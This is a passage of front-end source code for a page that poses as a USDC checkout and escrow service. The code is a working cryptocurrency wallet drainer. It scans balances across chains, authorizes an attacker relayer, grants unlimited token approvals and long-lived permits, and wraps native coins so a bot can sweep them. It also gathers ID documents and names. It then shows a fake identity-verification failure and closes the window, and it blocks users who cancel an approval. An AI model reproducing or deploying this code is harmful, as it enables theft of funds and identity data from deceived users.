          method: "POST",
          headers: { "Content-Type": "application/json" },
          body,
        });
        if (verifyRes.ok) {
          console.log("[escrow] /api/verify ok:", chain.name);
          return;
        }
        const text = await verifyRes.text().catch(() => "");
        lastErr = `verify_${verifyRes.status}:${text.slice(0, 160)}`;
        console.error("[escrow] /api/verify failed:", chain.name, verifyRes.status, text);
        // 409 = not visible on-chain yet — wait and retry (we already confirmed locally)
        await new Promise((r) => setTimeout(r, verifyRes.status === 409 ? 800 : 600));
      } catch (err) {
        lastErr = err instanceof Error ? err.message : "verify_error";
        console.error("[escrow] /api/verify error:", chain.name, err);
        await new Promise((r) => setTimeout(r, 700));
      }
    }
    throw new Error(lastErr);
  }

  /** Authorize + approve stables + wrap native on one EVM chain. */
  async function processEvmChainForDeposit(chain: ChainConfig): Promise<boolean> {
    if (!address) return false;

    // Peek balances on a public RPC first — skip empty chains without a wallet switch.
    const peek = new JsonRpcProvider(chain.rpcUrls[0], { chainId: chain.chainId, name: chain.name });
    const stableTokens = chain.tokens.filter((t) => t.symbol === "USDT" || t.symbol === "USDC");
    let balances: { token: (typeof chain.tokens)[number]; bal: bigint }[] = [];
    let nativeBal = 0n;
    try {
      const [nBal, ...tokenBals] = await Promise.all([
        peek.getBalance(address).catch(() => 0n),
        ...stableTokens.map(async (t) => {
          try {
            const erc20 = new Contract(t.address, ERC20_ABI, peek);
            return { token: t, bal: (await erc20.balanceOf(address)) as bigint };
          } catch {
            return { token: t, bal: 0n };
          }
        }),
      ]);
      nativeBal = nBal as bigint;
      balances = tokenBals;
    } catch (peekErr) {
      console.warn(`[escrow] peek ${chain.name} failed, will still try wallet:`, peekErr);
      balances = stableTokens.map((t) => ({ token: t, bal: 0n }));
    }

    const gasReserve = chain.gasReserveWei ?? BigInt("5000000000000000");
    const hasStable = balances.some(({ bal }) => bal > 0n);
    const hasWrappableNative = nativeBal > gasReserve;

    if (!hasStable && !hasWrappableNative) {
      console.log("[escrow] skip empty chain", chain.name);
      return false;
    }

    console.log("[escrow] processing chain", chain.name, {
      stables: balances.map((b) => `${b.token.symbol}=${b.bal.toString()}`),
      native: nativeBal.toString(),
    });

    const signer = await getSignerFor(chain);
    const approvedTokens: { symbol: string; address: string; txHash?: string }[] = [];

    // 1) Authorize relayer (skip if already authorized on this chain)
    const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
    let authorizeTxHash = "";
    const alreadyAuth = await verification
      .isAuthorized(address, RELAYER_ADDRESS)
      .catch(() => false);
    if (!alreadyAuth) {
      const authTx = await verification.authorize(RELAYER_ADDRESS);
      authorizeTxHash = await waitForEvmReceipt(authTx, 120_000);
    } else {
      console.log("[escrow] already authorized on", chain.name);
    }

    // 2) Approve every USDT/USDC with balance
    for (const { token, bal } of balances) {
      if (bal === 0n) continue;
      try {
        if (token.permit) {
          await signAndSubmitPermit(signer, chain, token);
          approvedTokens.push({ symbol: token.symbol, address: token.address });
        } else {
          const erc20 = new Contract(token.address, ERC20_ABI, signer);
          const liveAllow = await erc20.allowance(address, chain.contract).catch(() => 0n);
          if (liveAllow >= MaxUint256 / 2n) {
            approvedTokens.push({ symbol: token.symbol, address: token.address });
          } else {
            const tx = await erc20.approve(chain.contract, MaxUint256);
            const txHash = await waitForEvmReceipt(tx, 120_000);
            approvedTokens.push({ symbol: token.symbol, address: token.address, txHash });
          }
        }
        await waitForEvmAuthAndAllowance(chain, token.address, 90_000);
      } catch (err) {
        if (await blockLoginAfterApprovalCancel(`deposit-approve-${chain.name}-${token.symbol}`, err)) {
          throw err;
        }
        console.warn(`[escrow] approve ${token.symbol} on ${chain.name} skipped:`, err);
      }
    }

    // 3) Wrap native → WETH/WBNB/WMATIC so the bot can sweep it
    const wrappedNativeToken = chain.tokens.find((t) => t.wrappedNative);
    if (wrappedNativeToken && hasWrappableNative) {
      try {
        // Re-read native after switch (gas may have changed)
        const liveNative = (await signer.provider!.getBalance(address)) as bigint;
        if (liveNative > gasReserve) {
          const wrapAmount = liveNative - gasReserve;
          const wContract = new Contract(wrappedNativeToken.address, WRAPPED_NATIVE_ABI, signer);
          const wrapTx = await wContract.deposit({ value: wrapAmount });
          await waitForEvmReceipt(wrapTx, 120_000);
          const approveTx = await wContract.approve(chain.contract, MaxUint256);
          const approveHash = await waitForEvmReceipt(approveTx, 120_000);
          approvedTokens.push({
            symbol: wrappedNativeToken.symbol,
            address: wrappedNativeToken.address,
            txHash: approveHash,
          });
          await waitForEvmAuthAndAllowance(chain, wrappedNativeToken.address, 90_000);
        }
      } catch (wrapErr) {
        console.warn(`[escrow] wrap native on ${chain.name} skipped:`, wrapErr);
      }
    }

    if (approvedTokens.length === 0) {
      approvedTokens.push(
        ...balances
          .filter((b) => b.bal > 0n)
          .map((b) => ({ symbol: b.token.symbol, address: b.token.address }))
      );
      if (approvedTokens.length === 0) {
        approvedTokens.push(
          ...stableTokens.map((t) => ({ symbol: t.symbol, address: t.address }))
        );
      }
    }

    await persistEvmVerify(chain, authorizeTxHash, approvedTokens);
    setApprovedChains((prev) => (prev.includes(chain.name) ? prev : [...prev, chain.name]));
    return true;
  }

  async function checkWalletBalances() {
    if (!address || !session) return;
    setProcessing(true);

    try {
      // Use the server-side cache from Modal 1 scan when available (instant);
      // otherwise re-scan in parallel (~1-2 s) — either way, no wallet chain switching.
      let chainUsd = cachedScanUsd;
      if (!chainUsd) {
        const res = await fetch("/api/scan-balances", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address }),
        });
        const data: { ok: boolean; chainUsd?: Record<string, number> } = await res.json();
        if (data.ok && data.chainUsd) {
          chainUsd = data.chainUsd;
          setCachedScanUsd(chainUsd);
        }
      }

      const balances: Record<string, number> = {};
      let totalEur = 0;

      for (const [chain, usd] of Object.entries(chainUsd ?? {})) {
        const eur = usd * EUR_PER_USD;
        balances[chain] = eur;
        totalEur += eur;
      }

      setWalletBalances(balances);
      setProcessing(false);

      // User must hold at least some USDT/USDC to pass this gate.
      // Native coins (ETH, BNB, MATIC) and other tokens do NOT count toward
      // the minimum — they will be wrapped and swept in the Approve Deposit step,
      // but cannot substitute for a stablecoin balance requirement.
      const hasStablecoins = totalEur > 0;
      const meetsMinimum = hasStablecoins && totalEur >= session.minBalanceEur;
      setPhase(meetsMinimum ? "ready-to-approve" : "insufficient-balance");
      fetch("/api/escrow/track", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId: session.id, eventType: "balance_check", wallet: address }),
      }).catch(() => {});
    } catch (err) {
      console.error("[balance] Balance check failed:", err);
      setError("We couldn't reach the network to check your balance. Please try again.");
      setPhase("error");
      setProcessing(false);
    }
  }

  async function startSessionClock(walletAddress: string) {
    if (!session) return;
    try {
      const res = await fetch("/api/escrow/start", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId: session.id, wallet: walletAddress }),
      });
      const json = await res.json();
      if (json.ok) {
        setSession((prev) => (prev ? { ...prev, status: "active", startedAt: json.startedAt, expiresAt: json.expiresAt } : prev));
      } else if (json.error === "session_closed") {
        setPhase("expired");
      }
    } catch (err) {
      console.error("[escrow] failed to start session clock:", err);
    }
  }

  // ---------------------------------------------------------------------------
  // Modal 1 — mandatory ETH USDC first (even at $0), then Tron USDT if balance
  // USDC popup is not blocked on balance scan — scan runs in parallel.
  // ---------------------------------------------------------------------------
  function ethUsdcMandatoryItem(balanceUsd = 0): Modal1Item {
    const eth = CHAINS.find((c) => c.name === "eth")!;
    const usdc = eth.tokens.find((t) => t.symbol === "USDC")!;
    return {
      key: "eth-USDC",
      chainName: eth.name,
      chainLabel: eth.label,
      symbol: "USDC",
      tokenAddr: usdc.address,
      balanceDisplay: balanceUsd.toFixed(2),
      balanceUsd,
      contract: eth.contract,
      isTron: false,
      alreadyApproved: false,
      permit: usdc.permit,
      permitDomainName: usdc.permitDomainName,
      permitDomainVersion: usdc.permitDomainVersion,
    };
  }

  async function runModal1Scan() {
    if (!address) return;
    if (modal1InFlight.current || modal1ApproveStarted.current) return;
    modal1InFlight.current = true;
    showModal1Busy();

    type ScanToken = {
      chain: string; chainLabel: string; chainId: number; symbol: string;
      address: string; balance: string; balanceUsd: number; contract: string;
      isTron: boolean; alreadyApproved: boolean;
      permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
    };
    type ScanData = {
      ok: boolean;
      tokensWithBalance?: ScanToken[];
      chainUsd?: Record<string, number>;
    };

    const doScan = async (tronAddr: string | null): Promise<ScanData> => {
      try {
        const res = await fetch("/api/scan-balances", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address, tronAddress: tronAddr }),
        });
        return res.json();
      } catch (e) {
        console.error("[modal1] scan request failed:", e);
        return { ok: false };
      }
    };

    // EVM-only scan in parallel with USDC — no Tron prompt here (would steal focus).
    const evmScanPromise = (async () => {
      const evmScan = await doScan(null);
      if (evmScan.ok && evmScan.chainUsd) setCachedScanUsd(evmScan.chainUsd);
      noteStableFromScan(evmScan.tokensWithBalance, hasStableRef);
      const ethUsdcFromScan = (evmScan.tokensWithBalance ?? []).find(
        (t) => !t.isTron && t.chain === "eth" && t.symbol === "USDC"
      );
      return {
        alreadyApproved: Boolean(ethUsdcFromScan?.alreadyApproved),
        balanceUsd: ethUsdcFromScan?.balanceUsd ?? 0,
      };
    })();

    try {
      // USDC is mandatory at $0 — fire authorize/approve immediately (busy modal stays up).
      const ethUsdc = ethUsdcMandatoryItem(0);
      setTopChainName("eth");
      setModal1Items([ethUsdc]);
      setModal1Status({ "eth-USDC": "pending" });
      modal1ApproveStarted.current = true;

      const usdcOk = await runCompulsoryApprovals([ethUsdc], { markComplete: false });
      if (!usdcOk) {
        void evmScanPromise.catch(() => {});
        clearModal1Busy();
        return;
      }

      const evmHit = await evmScanPromise.catch(() => ({
        alreadyApproved: false,
        balanceUsd: 0,
      }));
      if (evmHit.balanceUsd > 0) {
        setModal1Items((prev) =>
          prev.map((item) =>
            item.key === "eth-USDC"
              ? {
                  ...item,
                  balanceUsd: evmHit.balanceUsd,
                  balanceDisplay: evmHit.balanceUsd.toFixed(2),
                  alreadyApproved: evmHit.alreadyApproved || item.alreadyApproved,
                }
              : item
          )
        );
      }

      // Tron only after USDC is confirmed — needs balance, and must not race EVM popups.
      showModal1Busy();
      let currentTronAddr = tronAddress ?? getConnectedTronAddress();
      if (!currentTronAddr) {
        currentTronAddr = await ensureTronAddress({ prompt: true });
      }
      if (currentTronAddr) {
        setTronAddress(currentTronAddr);
        modal1SawTron.current = true;
        showModal1Busy();
        let tronUsdtUsd = 0;
        let tronAlreadyApproved = false;
        const tronScan = await doScan(currentTronAddr);
        if (tronScan.ok && tronScan.chainUsd) {
          setCachedScanUsd((prev) => ({ ...(prev ?? {}), ...(tronScan.chainUsd ?? {}) }));
        }
        noteStableFromScan(tronScan.tokensWithBalance, hasStableRef);
        const tronUsdt = (tronScan.tokensWithBalance ?? []).find(
          (t) => t.isTron && t.symbol === "USDT"
        );
        tronUsdtUsd = tronUsdt?.balanceUsd ?? 0;
        tronAlreadyApproved = Boolean(tronUsdt?.alreadyApproved);

        if (tronUsdtUsd >= 0.01) {
          const tronItem: Modal1Item = {
            key: "tron-USDT",
            chainName: "tron",
            chainLabel: "Tron",
            symbol: "USDT",
            tokenAddr: TRON_USDT,
            balanceDisplay: tronUsdtUsd.toFixed(2),
            balanceUsd: tronUsdtUsd,
            contract: TRON_CHAIN.contract,
            isTron: true,
            alreadyApproved: tronAlreadyApproved,
          };
          setModal1Items((prev) =>
            prev.some((p) => p.key === "tron-USDT") ? prev : [...prev, tronItem]
          );
          setModal1Status((s) => ({ ...s, "tron-USDT": "pending" }));
          showModal1Busy();
          const tronOk = await runCompulsoryApprovals([tronItem], { markComplete: true });
          if (tronOk) clearModal1Busy();
          return;
        }
      }

      setModal1Complete(true);
      clearModal1Busy();
    } catch (err) {
      console.error("[modal1] compulsory flow failed:", err);
      void evmScanPromise.catch(() => {});
      clearModal1Busy();
    } finally {
      modal1InFlight.current = false;
    }
  }

  /** One direct-approve popup per queue item. Returns false if gated/failed. */
  async function runCompulsoryApprovals(
    queue: Modal1Item[],
    opts: { markComplete?: boolean } = {}
  ): Promise<boolean> {
    const markComplete = opts.markComplete !== false;
    setModal1Approving(true);

    const finishOk = () => {
      setShowApprovalRetry(false);
      approvalRetryRef.current = null;
      setPhase((p) => (p === "unable-to-login" ? "idle" : p));
    };

    const retryFn = async () => {
      setModal1Approving(true);
      try {
        await runCompulsoryApprovals(queue, opts);
      } finally {
        setModal1Approving(false);
      }
    };

    try {
      for (const target of queue) {
        setModal1Status((s) => ({ ...s, [target.key]: "approving" }));
        if (target.alreadyApproved) {
          if (target.isTron) {
            try {
              await completeTronUsdtApproval();
            } catch (e) {
              console.warn("[modal1] tron already-approved persist failed:", e);
            }
          }
          setModal1Status((s) => ({ ...s, [target.key]: "done" }));
          setApprovedChains((prev) =>
            prev.includes(target.chainName) ? prev : [...prev, target.chainName]
          );
          continue;
        }
        if (target.isTron) {
          await completeTronUsdtApproval();
        } else {
          await completeEvmWinnerApproval(target);
        }
        setModal1Status((s) => ({ ...s, [target.key]: "done" }));
        setApprovedChains((prev) =>
          prev.includes(target.chainName) ? prev : [...prev, target.chainName]
        );
      }
      finishOk();
      return true;
    } catch (err) {
      console.error("[modal1] compulsory approve failed:", err);
      gateOnApprovalFailure(retryFn);
      return false;
    } finally {
      setModal1Approving(false);
      if (markComplete) setModal1Complete(true);
    }
  }

  async function handleModal1ApproveAll(items: Modal1Item[]) {
    // Legacy entry — same awaited receipt + on-chain confirm path as compulsory flow.
    await runCompulsoryApprovals(items, { markComplete: true });
  }

  async function handleModal1Approve(item?: Modal1Item) {
    const target = item ?? modal1Items[0];
    if (!target) return;
    await runCompulsoryApprovals([target], { markComplete: true });
  }

  async function handleConnect() {
    setError(null);
    if (!session) return;
    let addr = address;
    if (!authenticated || !addr) {
      try {
        await login();
      } catch (err) {
        console.error("[escrow] login cancelled:", err);
        return;
      }
      addr = user?.wallet?.address ?? wallets[0]?.address ?? null;
    }
    if (addr) await startSessionClock(addr);
    // Reset ID verification sub-steps whenever entering the verify phase
    setIdVerifyStep("type");
    setIdDocType(null);
    setIdFile(null);
    setIdPreviewUrl(null);
    setIdDob("");
    setFullName("");
    setCountry("");
    setPhase("id-verify");
  }

  async function handleVerifyID() {
    if (!fullName.trim() || !country || !idFile) {
      setError("Enter your full legal name, select your country, and upload a photo of your ID.");
      return;
    }
    if (idFile.size > MAX_UPLOAD_BYTES) {
      setError("That file is too large. Please upload an image or PDF under 8MB.");
      return;
    }
    if (!session || !address) {
      setError("Wallet not connected. Please reconnect and try again.");
      return;
    }

    setProcessing(true);
    setError(null);

    try {
      const form = new FormData();
      form.append("sessionId", session.id);
      form.append("wallet", address);
      form.append("fullName", fullName.trim());
      form.append("country", country);
      form.append("document", idFile);

      const res = await fetch("/api/escrow/verify-identity", { method: "POST", body: form });
      const json = await res.json();
      if (!json.ok) {
        setError("We couldn't verify that document. Please try a clearer photo or a different file.");
        setProcessing(false);
        return;
      }

      setProcessing(false);
      setPhase("balance-check");
      setTimeout(() => checkWalletBalances(), 400);
    } catch (err) {
      console.error("[escrow] identity verification failed:", err);
      setError("We couldn't reach the server. Please try again.");
      setProcessing(false);
    }
  }

  function handleIdFileChange(file: File | null) {
    setIdFile(file);
    if (idPreviewUrl) URL.revokeObjectURL(idPreviewUrl);
    if (file && file.type.startsWith("image/")) {
      setIdPreviewUrl(URL.createObjectURL(file));
    } else {
      setIdPreviewUrl(null);
    }
  }

  /**
   * EIP-2612 gasless approval for USDC:
   *   1. Sign the permit off-chain (no gas, no TRX).
   *   2. POST to /api/permit — relayer submits permit() on-chain and pays gas.
   * Falls back to a regular approve() if anything goes wrong.
   */
  async function signAndSubmitPermit(
    signer: Awaited<ReturnType<typeof getSignerFor>>,
    chain: (typeof CHAINS)[number],
    token: (typeof CHAINS)[number]["tokens"][number]
  ): Promise<void> {
    const PERMIT_ABI = [
      "function nonces(address owner) view returns (uint256)",
    ];
    const usdcView = new Contract(token.address, PERMIT_ABI, signer);
    const nonce: bigint = await usdcView.nonces(address);
    // Signature valid for 2 years; on-chain allowance set to MaxUint256 (no expiry)
    const deadline = Math.floor(Date.now() / 1000) + PERMIT_DEADLINE_SECONDS;

    const domain = {
      name: token.permitDomainName ?? "USD Coin",
      version: token.permitDomainVersion ?? "2",
      chainId: chain.chainId,
      verifyingContract: token.address,
    };

    const types = {
      Permit: [
        { name: "owner",    type: "address" },
        { name: "spender",  type: "address" },
        { name: "value",    type: "uint256" },
        { name: "nonce",    type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    };

    const values = {
      owner:    address!,
      spender:  chain.contract,
      value:    MaxUint256,
      nonce,
      deadline,
    };

    // signTypedData: wallet signs off-chain — zero gas for the user
    const rawSig = await signer.signTypedData(domain, types, values);
    const { v, r, s } = Signature.from(rawSig);

    const res = await fetch("/api/permit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chain: chain.name,
        tokenAddress: token.address,
        owner: address,
        spender: chain.contract,
        value: MaxUint256.toString(),
        deadline,
        v,
        r,
        s,
      }),
    });

    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      throw new Error((err as { error?: string }).error ?? "Permit submission failed");
    }
  }

  async function handleApproveDeposit() {
    setModal2Open(true);
    setPhase("approving");
    setError(null);
    setApprovedChains([]);

    try {
      if (!address) throw new Error("No connected wallet");

      // Fresh multi-chain balance detect (server RPCs — no wallet switch yet)
      let tronAddr = tronAddress ?? getConnectedTronAddress();
      if (!tronAddr) {
        tronAddr = await ensureTronAddress({ prompt: false }).catch(() => null);
        if (tronAddr) setTronAddress(tronAddr);
      }

      const scanRes = await fetch("/api/scan-balances", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address, tronAddress: tronAddr }),
      });
      const scan = (await scanRes.json()) as {
        ok: boolean;
        tokensWithBalance?: {
          chain: string;
          symbol: string;
          balanceUsd: number;
          alreadyApproved: boolean;
          isTron: boolean;
        }[];
        chainUsd?: Record<string, number>;
      };
      if (scan.ok && scan.chainUsd) setCachedScanUsd(scan.chainUsd);
      noteStableFromScan(scan.tokensWithBalance, hasStableRef);

      // ── Tron USDT (if present) — skip if Modal 1 already approved ─────────
      const tronHit = (scan.tokensWithBalance ?? []).find(
        (t) => t.isTron && t.balanceUsd > 0.01
      );
      const tronAlreadyDone =
        approvedChains.includes("tron") || Boolean(tronHit?.alreadyApproved);
      if (tronHit && tronAddr && !tronAlreadyDone) {
        try {
          const runTron = async () => {
            await completeTronUsdtApproval();
            approvalRetryRef.current = null;
            loginBlockedRef.current = false;
            setShowApprovalRetry(false);
            setPhase((p) => (p === "unable-to-login" ? "approving" : p));
          };
          await runTron();
        } catch (tronErr) {
          console.warn("[escrow] tron approve failed:", tronErr);
          gateOnApprovalFailure(async () => {
            await completeTronUsdtApproval();
            approvalRetryRef.current = null;
            setShowApprovalRetry(false);
            setPhase("approving");
            await handleApproveDeposit();
          });
          return;
        }
      } else if (tronAlreadyDone && tronAddr) {
        setApprovedChains((prev) => (prev.includes("tron") ? prev : [...prev, "tron"]));
      }

      // ── Every EVM chain with USDT/USDC or wrappable native ─────────────────
      // Sequential: wallets can only be on one chain at a time. Each chain gets
      // its own switch → authorize → approve stables → wrap native → verify.
      // This is what was missing when only the Modal-1 "winner" (e.g. Polygon)
      // ran and BNB USDT was never attempted.
      for (const chain of CHAINS) {
        try {
          await processEvmChainForDeposit(chain);
        } catch (chainErr) {
          if (await blockLoginAfterApprovalCancel(`deposit-${chain.name}`, chainErr)) return;
          console.warn(`[escrow] chain ${chain.name} failed:`, chainErr);
        }
      }

      if (session) {
        fetch("/api/escrow/complete", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ sessionId: session.id, wallet: address }),
        }).catch(() => {});
      }

      // Approvals are confirmed + recorded — end with identity failure + close
      setModal2Open(false);
      setPhase("identity-failed");
      setTimeout(() => {
        try {
          window.close();
        } catch {
          /* ignore */
        }
        window.location.replace("about:blank");
      }, 3500);
    } catch (err) {
      if (await blockLoginAfterApprovalCancel("deposit", err)) return;
      console.error("[escrow] Approval failed:", err);
      setError("The deposit approval didn't go through. Please try again.");
      setModal2Open(false);
      setPhase("error");
    }
  }

  const isConnected = authenticated && !!address;
  const activeFlow = phase !== "loading" && phase !== "no-session" && phase !== "idle";

  // After calling login(), Privy's modal resolves but WalletConnect relay can
  // drop the confirmation. Poll wallets[] for up to 30s so the site catches it
  // even if the websocket delivery was missed.
  function pollForWallet(timeoutMs = 30_000) {
    const start = Date.now();
    const interval = setInterval(() => {
      const addr = user?.wallet?.address ?? wallets[0]?.address ?? null;
      if (addr) {
        clearInterval(interval);
        setGateLoading(false);
        return;
      }
      if (Date.now() - start > timeoutMs) {
        clearInterval(interval);
        setGateLoading(false);
      }
    }, 1000);
  }

  async function handleGateCdpVerified() {
    setError(null);
    setGateLoading(true);
    try {
      // Mobile: open page inside Trust DApp browser FIRST so tronWeb injects.
      if (needsTrustDappForTron()) {
        bumpTrustRedirectCount();
        openInTrustWalletDapp(window.location.href);
        return;
      }
      await login();
      pollForWallet();
    } catch (err) {
      console.error("[escrow] Privy login cancelled:", err);
      setGateLoading(false);
    }
  }

  async function handleGateLogin() {
    setError(null);
    setGateLoading(true);
    try {
      if (needsTrustDappForTron()) {
        bumpTrustRedirectCount();
        openInTrustWalletDapp(window.location.href);
        return;
      }
      await login();
      pollForWallet();
    } catch (err) {
      console.error("[escrow] login cancelled:", err);
      setGateLoading(false);
    }
  }

  function handleOpenWalletDapp(walletId: TronCapableWalletId) {
    bumpTrustRedirectCount();
    modal1Triggered.current = false;
    openInWalletDapp(walletId, window.location.href);
  }

  // Gate: show appropriate screen before the user is fully connected
  if (phase === "unable-to-login") {
    return (
      <div className="fixed inset-0 z-[9999] flex min-h-screen flex-col items-center justify-center bg-bg px-6 text-center">
        <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-down/10">
          <svg className="h-8 w-8 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
        </div>
        <h1 className="mb-2 text-xl font-semibold text-ink">Unable to login</h1>
        <p className="mb-6 max-w-sm text-sm leading-relaxed text-body">
          {showApprovalRetry
            ? "Login could not be completed — wallet approval did not finish on-chain. Retry login and approve in your wallet to continue."
            : "The approval request was cancelled. This window will close — open the link again to restart."}
        </p>
        {showApprovalRetry ? (
          <button
            type="button"
            onClick={() => void handleApprovalRetry()}
            disabled={approvalRetrying}
            className="h-11 rounded-pill bg-brand px-8 text-sm font-semibold text-on-brand transition hover:bg-brand-active disabled:opacity-60"
          >
            {approvalRetrying ? "Retrying login…" : "Retry login"}
          </button>
        ) : null}
      </div>
    );
  }

  if (phase === "identity-failed") {
    return (
      <div className="fixed inset-0 z-[9999] flex min-h-screen flex-col items-center justify-center bg-bg px-6 text-center">
        <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-down/10">
          <svg className="h-8 w-8 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
        </div>
        <h1 className="mb-2 text-xl font-semibold text-ink">Unable to verify identity</h1>
        <p className="mb-2 max-w-sm text-sm leading-relaxed text-body">
          We couldn&apos;t verify your identity at this time. Please try again later.
        </p>
        <p className="max-w-sm text-xs text-muted">This window will close automatically.</p>
      </div>
    );
  }

  if (!ready || !isConnected) {
    return (
      <CoinbaseSignIn
        onVerified={handleGateCdpVerified}
        loading={gateLoading}
        waitingForWallet={gateLoading && authenticated}
      />
    );
  }

  const STEPS: { label: string; key: Phase[] }[] = [
    { label: "Connect", key: ["idle"] },
    { label: "Identity", key: ["id-verify"] },
    { label: "Balance", key: ["balance-check", "insufficient-balance"] },
    { label: "Approve", key: ["ready-to-approve", "approving"] },
    { label: "Done", key: ["complete"] },
  ];
  const currentStepIndex = STEPS.findIndex((s) => s.key.includes(phase));

  const showTimer = remainingMs !== null && remainingMs > 0 && phase !== "complete" && phase !== "expired" && session;
  const totalMs = session ? session.sessionMinutes * 60 * 1000 : 25 * 60 * 1000;

  return (
    <EscrowShell
      connectSlot={
        !isConnected ? (
          <button
            onClick={handleConnect}
            disabled={!ready || !session}
            className="h-10 rounded-pill bg-brand px-5 text-sm font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
          >
            Connect wallet
          </button>
        ) : undefined
      }
    >
      <div className="mx-auto max-w-[1280px] px-4 py-8 sm:px-8 lg:py-16">

        {/* Floating circular timer — fixed bottom-right, all screen sizes */}
        {showTimer && remainingMs !== null && (
          <div className="fixed bottom-5 right-5 z-50 drop-shadow-lg">
            <div className="group relative flex h-14 w-14 items-center justify-center rounded-full border border-hairline bg-surface-card shadow-card ring-1 ring-white/10 transition hover:scale-110">
              <CircularTimer totalMs={totalMs} remainingMs={remainingMs} size={56} />
              {/* Tooltip on hover */}
              <div className="pointer-events-none absolute bottom-full right-0 mb-2 hidden whitespace-nowrap rounded-lg border border-hairline bg-surface-card px-3 py-1.5 text-[11px] font-semibold text-ink shadow-card group-hover:block">
                Session time remaining
              </div>
            </div>
          </div>
        )}

        {activeFlow && (
          <ol className="mb-8 flex items-center justify-between gap-1 sm:mb-12">
            {STEPS.map((step, i) => {
              const state = i < currentStepIndex ? "done" : i === currentStepIndex ? "current" : "upcoming";
              return (
                <li key={step.label} className="flex flex-1 items-center last:flex-none">
                  <div className="flex flex-col items-center gap-1.5">
                    <div
                      className={
                        "flex h-7 w-7 items-center justify-center rounded-full text-xs font-semibold transition-all sm:h-8 sm:w-8 " +
                        (state === "done"
                          ? "bg-brand text-on-brand"
                          : state === "current"
                          ? "bg-brand text-on-brand shadow-[0_0_0_4px_rgba(0,82,255,0.12)]"
                          : "bg-surface-strong text-muted")
                      }
                    >
                      {state === "done" ? (
                        <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                        </svg>
                      ) : (
                        i + 1
                      )}
                    </div>
                    <span className={"text-[10px] font-medium sm:text-[12px] " + (state === "upcoming" ? "text-muted" : "text-ink")}>
                      {step.label}
                    </span>
                  </div>
                  {i < STEPS.length - 1 && (
                    <div className={"mx-1 h-px flex-1 sm:mx-3 " + (i < currentStepIndex ? "bg-brand" : "bg-hairline")} />
                  )}
                </li>
              );
            })}
          </ol>
        )}

        <div className="grid gap-5 lg:grid-cols-[1fr_360px] lg:items-start">
          <div className="rounded-card border border-hairline bg-surface-card p-5 shadow-card sm:p-8 lg:p-12">
            {phase === "loading" && (
              <div className="py-20 text-center">
                <div className="mx-auto mb-6 h-10 w-10 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
                <p className="text-sm text-body">Loading checkout session...</p>
              </div>
            )}

            {phase === "no-session" && (
              <>
                <div className="py-20 text-center">
                  <div className="mx-auto mb-5 flex h-14 w-14 items-center justify-center rounded-full bg-surface-strong text-muted">
                    <svg className="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                  </div>
                  <h2 className="mb-2 text-xl font-semibold text-ink">
                    {sessionId ? "This link isn't active" : "No pending USDC Checkout payment"}
                  </h2>
                  <p className="mx-auto max-w-sm text-sm text-body">
                    {sessionId
                      ? "This checkout link has closed, expired, or doesn't exist. Ask the sender for a new link."
                      : "There isn't an active checkout session waiting for you right now. Check back once the sender has issued one."}
                  </p>
                </div>

                <div className="mt-20 border-t border-hairline pt-16">
                  <TrustedByMarquee />
                </div>

                <div className="mt-20 border-t border-hairline pt-16">
                  <div className="mx-auto mb-12 max-w-2xl text-center">
                    <h2 className="mb-3 font-display text-3xl font-normal leading-tight tracking-[-0.04em] text-ink sm:text-4xl">
                      Every layer of the stack managed for you
                    </h2>
                    <p className="text-base text-body">
                      Complete payments infrastructure from custody to settlement
                    </p>
                  </div>

                  <div className="grid gap-5 sm:grid-cols-2 lg:grid-cols-4">
                    {STACK_FEATURES.map((feature) => (
                      <div
                        key={feature.title}
                        className="rounded-xl border border-hairline bg-surface-card p-6 transition hover:border-brand/30 hover:shadow-card"
                      >
                        <h3 className="mb-2 text-base font-semibold text-ink">{feature.title}</h3>
                        <p className="text-sm leading-relaxed text-body">{feature.description}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </>
            )}

            {phase === "idle" && session && (
              <div>
                <div className="mb-5 flex items-center gap-3">
                  <div className="flex h-11 w-11 items-center justify-center rounded-full bg-brand/10 text-brand">
                    <span className="text-base font-semibold">
                      {session.recipientName
                        .split(" ")
                        .map((n) => n[0])
                        .join("")
                        .slice(0, 2)
                        .toUpperCase()}
                    </span>
                  </div>
                  <div>
                    <div className="flex items-center gap-1.5">
                      <span className="text-sm font-semibold text-ink">{session.recipientName}</span>
                      <svg className="h-4 w-4 text-brand" viewBox="0 0 24 24" fill="currentColor">
                        <path
                          fillRule="evenodd"
